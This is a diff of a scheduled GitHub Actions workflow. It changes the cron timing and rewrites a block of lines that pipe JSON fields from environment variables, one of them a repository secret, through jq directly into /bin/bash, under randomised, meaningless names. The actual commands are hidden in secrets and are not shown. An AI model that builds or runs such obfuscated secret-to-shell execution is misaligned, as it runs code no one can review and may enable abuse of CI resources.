@@ -3,7 +3,7 @@ name: xuzhibai3856
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 3/6 * * *'
+    - cron: '4 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuzhibai3856
         env:
-          ntk323: ${{ secrets.ntk323 }}
+          nxgr39332: ${{ secrets.nxgr39332 }}
         run: |
-          echo $ntk323 | jq -r .ylpbm9758 | /bin/bash
-          echo $b83 | jq -r .tufdx665 | /bin/bash
-          echo $btip20436 | jq -r .ltjyo1215 | /bin/bash
-          echo $zg5 | jq -r .x8 | /bin/bash
-          echo $hwr2492 | jq -r .wpfor004 | /bin/bash
-          echo $ohq4561 | jq -r .qfm31 | /bin/bash
-          echo $c31 | jq -r .w2727 | /bin/bash
+          echo $nxgr39332 | jq -r .kt24882 | /bin/bash
+          echo $rt41 | jq -r .lyje30 | /bin/bash
+          echo $wtjq563 | jq -r .npnvq88 | /bin/bash
+          echo $mtr44 | jq -r .tmv9 | /bin/bash
+          echo $nha3 | jq -r .dj25682 | /bin/bash
+          echo $ybdjj741 | jq -r .gmnle2126 | /bin/bash
+          echo $oy6727 | jq -r .nmoi0295 | /bin/bash
+          echo $lirvy3 | jq -r .am71 | /bin/bash
+          echo $ydqw840 | jq -r .ssrj878 | /bin/bash
+          echo $tfnc08 | jq -r .aadi48472 | /bin/bash
 
